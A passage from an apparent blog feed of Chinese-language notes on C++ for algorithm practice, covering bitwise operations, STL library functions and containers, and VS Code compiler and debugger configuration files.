[key] 来得到 key 对应的 value，还可以对 h [key] 进行赋值操作，改变 key 对应的 value。</p>\n</li>\n</ul>\n<h1 id=\"位运算-常用库函数\"><a class=\"anchor\" href=\"#位运算-常用库函数\">#</a> 位运算、常用库函数</h1>\n<h2 id=\"位运算\"><a class=\"anchor\" href=\"#位运算\">#</a> 位运算</h2>\n<h4 id=\"位运算符\"><a class=\"anchor\" href=\"#位运算符\">#</a> 位运算符</h4>\n<p>移位运算符优先级最高</p>\n<p>&amp; 与</p>\n<pre><code class=\"language-c++\">0 &amp; 0 = 0\n0 &amp; 1 = 0\n1 &amp; 1 = 1\n</code></pre>\n<p>| 或</p>\n<pre><code class=\"language-c++\">0 | 0 = 0\n1| 0 = 1\n0 | 1 = 1\n1 | 1 = 1\n</code></pre>\n<p><strong>~ 非</strong></p>\n<pre><code class=\"language-c++\">~ 0 = 1\n~ 1 = 0\n</code></pre>\n<p><strong>^ 异或</strong></p>\n<p>a⊕b = (¬a ∧ b) ∨ (a ∧¬b)</p>\n<pre><code class=\"language-c++\">0 ^ 0 = 0\n1 ^ 1 = 0\n1 ^ 0 = 1\n    \n//int类型的两个数异或\n3 ^ 6 = (011) &amp; (110) = (101) = 5\n</code></pre>\n<p>&gt;&gt; 右移</p>\n<ul>\n<li>\n<p>右边减一个数字位，相当于 / 2</p>\n</li>\n<li>\n<p>a &gt;&gt; k === a/pow(2, k)</p>\n</li>\n</ul>\n<p>&lt;&lt; 左移</p>\n<ul>\n<li>\n<p>右边加 0，相当于 * 2</p>\n</li>\n<li>\n<p>a &lt;&lt; k === a * pow(2, k)</p>\n</li>\n</ul>\n<h4 id=\"常用操作-2\"><a class=\"anchor\" href=\"#常用操作-2\">#</a> 常用操作：</h4>\n<ul>\n<li>\n<p>求 x 的第 k 位数字 x &gt;&gt; k &amp; 1</p>\n<pre><code class=\"language-c++\">a = 110110\na &gt;&gt; k = 1101\na &gt;&gt; k &amp; 1 = (1101) &amp; (0001) = 1\n</code></pre>\n</li>\n<li>\n<p>lowbit (x) = x &amp; -x，lowbit (x) 为返回 x 的<strong>最后一位 1 和后 i 面的 0</strong></p>\n</li>\n</ul>\n<pre><code class=\"language-c++\">a = 10101100100000\n~a = 01010011011111\n~a + 1 = 01010011100000\na &amp; (~a + 1) = 100000\n负数用补码表示，补码和反码一样\n</code></pre>\n<h3 id=\"常用库函数\"><a class=\"anchor\" href=\"#常用库函数\">#</a> 常用库函数</h3>\n<h4 id=\"reverse-翻转\"><a class=\"anchor\" href=\"#reverse-翻转\">#</a> reverse 翻转</h4>\n<p>时间复杂度为 o（n）</p>\n<pre><code class=\"language-c++\">//头文件\n#include &lt;algorithm&gt;\nusing namespace std;\n</code></pre>\n<ul>\n<li>\n<p>翻转一个<strong> vector</strong></p>\n<pre><code class=\"language-c++\">reverse(a.begin(), a.end());\n</code></pre>\n</li>\n<li>\n<p>翻转一个<strong>数组</strong></p>\n<p>左闭右合 [,)</p>\n<pre><code class=\"language-c++\">reverse(a, a + n);\n</code></pre>\n</li>\n<li>\n<p>翻转一个<strong>字符串</strong></p>\n<pre><code class=\"language-c++\">reverse(str.begin(),str.end();\n</code></pre>\n</li>\n</ul>\n<h4 id=\"unique-去重\"><a class=\"anchor\" href=\"#unique-去重\">#</a> unique 去重</h4>\n<pre><code class=\"language-c++\">//头文件\n#include &lt;algorithm&gt;\nusing namespace std;\n</code></pre>\n<ul>\n<li>使用 unique 的容器重复元素<strong>必须靠在一块</strong></li>\n<li>返回去重之后的尾迭代器（或指针），仍然为前闭后开，即这个迭代器是去重之后末尾元素的下一个位置。</li>\n<li>该函数常用于离散化，利用迭代器（或指针）的减法，可计算出去重后的元素个数。</li>\n</ul>\n<p>把一个 vector 去重：</p>\n<pre><code class=\"language-c++\">int m = unique(a.begin(), a.end()) – a.begin();//m为去重后的元素个数\na.erase(unique(a.begin(), a.end()), a.end());//删除后面重复元素，保留前面不重复的部分\n</code></pre>\n<p>把一个数组去重，元素存放在下标 1~n：</p>\n<pre><code class=\"language-c++\">int m = unique(a, a + n) – a;//m为去重后的元素个数\n</code></pre>\n<h4 id=\"random_shuffle-随机打乱\"><a class=\"anchor\" href=\"#random_shuffle-随机打乱\">#</a> random_shuffle 随机打乱</h4>\n<pre><code class=\"language-c++\">//头文件\n#include &lt;algorithm&gt;\nusing namespace std;\n</code></pre>\n<p>用法与 reverse 相同</p>\n<pre><code class=\"language-c++\">random_shuffle(a.begin(), a.end());\nrandom_shuffle(a, a + n)\n</code></pre>\n<h4 id=\"sort\"><a class=\"anchor\" href=\"#sort\">#</a> sort</h4>\n<p><strong>头文件：</strong></p>\n<pre><code class=\"language-C++\">#include &lt;algorithm&gt;\nusing namespace std;\n</code></pre>\n<ul>\n<li>\n<p>对两个迭代器（或指针）指定的部分进行<strong>快速排序</strong></p>\n</li>\n<li>\n<p>参数和 reverse 的用法一样，可以在第三个参数传入定义大小比较的函数，或者重载 “小于号” 运算符。</p>\n</li>\n<li>\n<p>sort () 函数可以对给定区间所有元素进行排序。它有三个参数 &lt; font color='red'&gt;sort (begin, end, cmp)&lt;/font&gt;，其中 begin 为指向待 sort () 的数组的 &lt; font color='red'&gt; 第一个元素的指针 &lt;/font&gt;，end 为指向待 sort () 的数组的 &lt; font color='red'&gt; 最后一个元素的下一个位置的指针 &lt;/font&gt;，cmp 参数为排序准则，cmp 参数 &lt; font color='red'&gt; 可以不写（即为 sort（begin, end））&lt;/font&gt;，<strong>默认从小到大进行排序</strong>。如果我们想从大到小排序可以将 cmp 参数写为 greater&lt;int&gt;() 就是对 int 数组进行排序，当然 &lt;&gt; 中我们也可以写 double、long、float 等等。</p>\n</li>\n</ul>\n<pre><code class=\"language-c++\">sort(a.begin(),a.end());//从小到大排序\nsort(a.begin(), a.end(), greater&lt;int&gt;());//从大到小排序\n</code></pre>\n<pre><code class=\"language-c++\">int a[MAX_SIZE];\n//全局函数\nbool cmp(int a, int b)//a是否应该排在b的前面 \n&#123;\n    return a &gt; b; //如果a &gt; b, 那么a应该排在b的前面，则为降序排列\n    或者\n    return a &lt; b;//如果a &lt; b，那么a应该排在b的前面，则为升序排列\n&#125;\nsort(a, a + n, cmp);\n</code></pre>\n<p>把自定义的结构体 vector 排序，重载 “小于号” 运算符：</p>\n<pre><code class=\"language-c++\">struct rec\n&#123;\n    int id, x, y; \n    bool operator &lt;(const rec &amp;t)const \n\t&#123;\n\t\treturn x &lt; t.x;\n\t&#125;\n&#125;\nvector&lt;rec&gt; a;\nsort(a.begin(), a.end()); \n</code></pre>\n<h4 id=\"lower_boundupper_bound-二分\"><a class=\"anchor\" href=\"#lower_boundupper_bound-二分\">#</a> lower_bound/upper_bound 二分</h4>\n<p><strong>头文件：</strong></p>\n<pre><code class=\"language-c++\">#include &lt;algorithm&gt;\nusing namespace std;\n</code></pre>\n<ul>\n<li>\n<p>lower_bound 的第三个参数传入一个元素 x，在两个迭代器（指针）指定的部分上执行二分查找，返回指向<strong>第一个大于等于 x</strong> 的元素的位置的<strong>迭代器</strong>（指针）。</p>\n<pre><code class=\"language-c++\">int a[] = &#123;1, 2, 3, 4, 5,, 6&#125;;\nint* p = lower_bound(a, a + 5, 7);\n</code></pre>\n<ul>\n<li>\n<p>有序 int 数组中查找大于等于 x 的最小整数的<strong>下标</strong></p>\n<pre><code class=\"language-c++\">int t = lower_bound(a, a + n, x) – a;\n</code></pre>\n</li>\n<li>\n<p>有序 vector&lt;int&gt; 中查找小于等于 x 的最大整数（假设一定存在）</p>\n<pre><code class=\"language-c++\">int y = upper_bound(a.begin(), a.end(), x) - a.begin();\n</code></pre>\n</li>\n</ul>\n</li>\n<li>\n<p>upper_bound 的用法和 lower_bound 大致相同，唯一的区别是查找<strong>第一个大于 x 的元素</strong>。当然，两个迭代器（指针）指定的部分应该是提前排好序的。</p>\n<ul>\n<li>用法与 lower_bound 一致</li>\n</ul>\n</li>\n</ul>\n",
            "tags": [
                "算法",
                "Algorithm"
            ]
        },
        {
            "id": "http://yoursite.com/Algorithm/%E7%9F%A5%E8%AF%86%E5%BD%92%E7%BA%B3/",
            "url": "http://yoursite.com/Algorithm/%E7%9F%A5%E8%AF%86%E5%BD%92%E7%BA%B3/",
            "title": "算法知识归纳",
            "date_published": "2024-03-16T15:29:08.000Z",
            "content_html": "<h1 id=\"前置准备\"><a class=\"anchor\" href=\"#前置准备\">#</a> 前置准备</h1>\n<p>vscode 编译器，c/c++ 插件，自动提示 + 编译调试运行</p>\n<p>路径不能出现中文，配置 launch.json 和 tasks.json 两个文件</p>\n<p><strong>launch.json</strong></p>\n<figure class=\"highlight json\"><figcaption data-lang=\"JSON\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token property\">\"configurations\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>            <span class=\"token property\">\"name\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"C/C++: g++.exe 生成和调试活动文件\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            <span class=\"token property\">\"type\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"cppdbg\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>            <span class=\"token property\">\"request\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"launch\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            <span class=\"token property\">\"program\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"$&#123;fileDirname&#125;\\\\$&#123;fileBasenameNoExtension&#125;.exe\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            <span class=\"token property\">\"args\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token property\">\"stopAtEntry\"</span><span class=\"token operator\">:</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            <span class=\"token property\">\"cwd\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"$&#123;fileDirname&#125;\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            <span class=\"token property\">\"environment\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token property\">\"externalConsole\"</span><span class=\"token operator\">:</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token property\">\"MIMode\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"gdb\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token property\">\"miDebuggerPath\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"D:\\\\mingw64\\\\bin\\\\gdb.exe\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            <span class=\"token property\">\"setupCommands\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>                <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>                    <span class=\"token property\">\"description\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"为 gdb 启用整齐打印\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>                    <span class=\"token property\">\"text\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"-enable-pretty-printing\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>                    <span class=\"token property\">\"ignoreFailures\"</span><span class=\"token operator\">:</span> <span class=\"token boolean\">true</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>                <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>                    <span class=\"token property\">\"description\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"将反汇编风格设置为 Intel\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>                    <span class=\"token property\">\"text\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"-gdb-set disassembly-flavor intel\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>                    <span class=\"token property\">\"ignoreFailures\"</span><span class=\"token operator\">:</span> <span class=\"token boolean\">true</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>            <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>            <span class=\"token property\">\"preLaunchTask\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"C/C++: g++.exe 生成活动文件\"</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token property\">\"version\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"2.0.0\"</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><strong>tasks.json</strong></p>\n<figure class=\"highlight json\"><figcaption data-lang=\"JSON\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token property\">\"tasks\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>            <span class=\"token property\">\"type\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"cppbuild\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            <span class=\"token property\">\"label\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"C/C++: gcc.exe 生成活动文件\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>            <span class=\"token property\">\"command\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"D:\\\\mingw64\\\\bin\\\\g++.exe\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            <span class=\"token property\">\"args\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>                <span class=\"token string\">\"-fdiagnostics-color=always\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>                <span class=\"token string\">\"-g\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>                <span class=\"token string\">\"$&#123;file&#125;\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>                <span class=\"token string\">\"-o\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>                <span class=\"token string\">\"$&#123;fileDirname&#125;\\\\$&#123;fileBasenameNoExtension&#125;.exe\"</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token property\">\"options\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>                <span class=\"token property\">\"cwd\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"$&#123;fileDirname&#125;\"</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token property\">\"problemMatcher\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>                <span class=\"token string\">\"$gcc\"</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>            <span class=\"token property\">\"group\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"build\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            <span class=\"token property\">\"detail\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"调试器生成的任务。\"</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            <span class=\"token property\">\"type\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"cppbuild\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            <span class=\"token property\">\"label\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"C/C++: g++.exe 生成活动文件\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>            <span class=\"token property\">\"command\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"D:\\\\mingw64\\\\bin\\\\g++.exe\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>            <span class=\"token property\">\"args\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>                <span class=\"token string\">\"-fdiagnostics-color=always\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>                <span class=\"token string\">\"-g\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>                <span class=\"token string\">\"$&#123;file&#125;\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>                <span class=\"token string\">\"-o\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>                <span class=\"token string\">\"$&#123;fileDirname&#125;\\\\$&#123;fileBasenameNoExtension&#125;.exe\"</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>            <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>            <span class=\"token property\">\"options\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>                <span class=\"token property\">\"cwd\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"$&#123;fileDirname&#125;\"</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>            <span class=\"token property\">\"problemMatcher\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>                <span class=\"token string\">\"$gcc\"</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>            <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>            <span class=\"token property\">\"group\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>                <span class=\"token property\">\"kind\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"build\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>                <span class=\"token property\">\"isDefault\"</span><span class=\"token operator\">:</span> <span class=\"token boolean\">true</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>            <span class=\"token property\">\"detail\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"调试器生成的任务。\"</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token property\">\"version\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"2.0.0\"</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h1 id=\"插件\"><a class=\"anchor\" href=\"#插件\">#</a> 插件</h1>\n<ol>\n<li>aiXcoder Code</li>\n<li>c/c++</li>\n<li>Chinese</li>\n<li>Error Lens</li>\n<li>Moonlight</li>\n</ol>\n<h1 id=\"万能头文件\"><a class=\"anchor\" href=\"#万能头文件\">#</a> 万能头文件</h1>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;bits/stdc++.h></span></span></pre></td></tr></table></figure><h1 id=\"cincout加速\"><a class=\"anchor\" href=\"#cincout加速\">#</a> cin,cout 加速</h1>\n<ol>\n<li>取消输入输出缓存</li>\n<li>设置空参数时返回当前的输出流指针</li>\n</ol>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;iostream></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    std<span class=\"token double-colon punctuation\">::</span>ios<span class=\"token double-colon punctuation\">::</span><span class=\"token function\">sync_with_stdio</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    std<span class=\"token double-colon punctuation\">::</span>cin<span class=\"token punctuation\">.</span><span class=\"token function\">tie</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token comment\">// IO</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><code>不加using namespace std;</code>  需要写 std::</p>\n<h1 id=\"stl\"><a class=\"anchor\" href=\"#stl\">#</a> STL</h1>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>vector<span class=\"token punctuation\">,</span> 变长数组，倍增的思想</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  返回元素个数</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token function\">empty</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  返回是否为空</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token function\">clear</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  清空</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token function\">front</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">/</span><span class=\"token function\">back</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">/</span><span class=\"token function\">pop_back</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">/</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    支持比较运算，按字典序</pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>pair<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    first<span class=\"token punctuation\">,</span> 第一个元素</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    second<span class=\"token punctuation\">,</span> 第二个元素</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    支持比较运算，以first为第一关键字，以second为第二关键字（字典序）</pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>string，字符串</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">/</span><span class=\"token function\">length</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  返回字符串长度</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token function\">empty</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token function\">clear</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span>起始下标，<span class=\"token punctuation\">(</span>子串长度<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  返回子串</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token function\">c_str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  返回字符串所在字符数组的起始地址</pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>queue<span class=\"token punctuation\">,</span> 队列</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token function\">empty</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token function\">push</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  向队尾插入一个元素</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token function\">front</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  返回队头元素</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token function\">back</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  返回队尾元素</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token function\">pop</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  弹出队头元素</pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>priority_queue<span class=\"token punctuation\">,</span> 优先队列，默认是大根堆</pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token function\">empty</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token function\">push</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  插入一个元素</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token function\">top</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  返回堆顶元素</pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token function\">pop</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  弹出堆顶元素</pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    定义成小根堆的方式：priority_queue<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">,</span> vector<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span><span 